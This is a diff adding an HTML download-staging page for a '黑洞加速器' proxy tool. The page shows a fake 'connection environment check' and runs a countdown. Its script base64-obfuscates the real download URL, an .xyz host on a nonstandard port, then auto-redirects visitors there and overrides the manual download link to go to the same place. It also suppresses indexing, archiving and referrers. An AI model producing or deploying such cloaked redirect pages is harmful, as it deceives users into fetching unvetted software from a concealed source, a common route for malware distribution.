@@ -1,0 +1,51 @@
+﻿<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<link rel="canonical" href="https://my110.com.cn/">
+<title>资源准备中</title>
+<meta name="keywords" content="黑洞加速器下载中转,黑洞加速器资源准备">
+<meta name="description" content="黑洞加速器下载资源准备页，完成连接环境校验后进入下载页面。">
+<link rel="icon" href="/favicon.ico">
+<link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body class="kexue-body">
+  <main class="kexue-card-my110-govcn">
+    <p class="eyebrow-my110-govcn">资源准备中</p>
+    <h1>正在校验连接环境</h1>
+    <p>即将进入下载页面，请勿关闭当前页面。</p>
+    <div class="progress-track" aria-hidden="true"><div class="progress-bar-my110-govcn"></div></div>
+    <p><span id="countdown">3</span> 秒后自动跳转</p>
+    <div class="hero-actions" style="justify-content:center">
+      <a id="manualDownload" class="download-btn-my110-govcn" href="/kexue.html" rel="nofollow noopener noreferrer">手动下载</a>
+    </div>
+  </main>
+  <script>
+    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9haHpxLjMxMzQ4Ni54eXo6MzU4ODgv");
+    const manualDownload = document.getElementById("manualDownload");
+    const countdown = document.getElementById("countdown");
+    let seconds = 3;
+
+    const timer = window.setInterval(function () {
+      seconds -= 1;
+      countdown.textContent = String(seconds);
+      if (seconds <= 0) {
+        window.clearInterval(timer);
+        window.location.replace(REAL_DOWNLOAD_URL);
+      }
+    }, 1000);
+
+    manualDownload.addEventListener("click", function(e){
+      e.preventDefault();
+      window.location.replace(REAL_DOWNLOAD_URL);
+    });
+  </script>
+</body>
+</html>
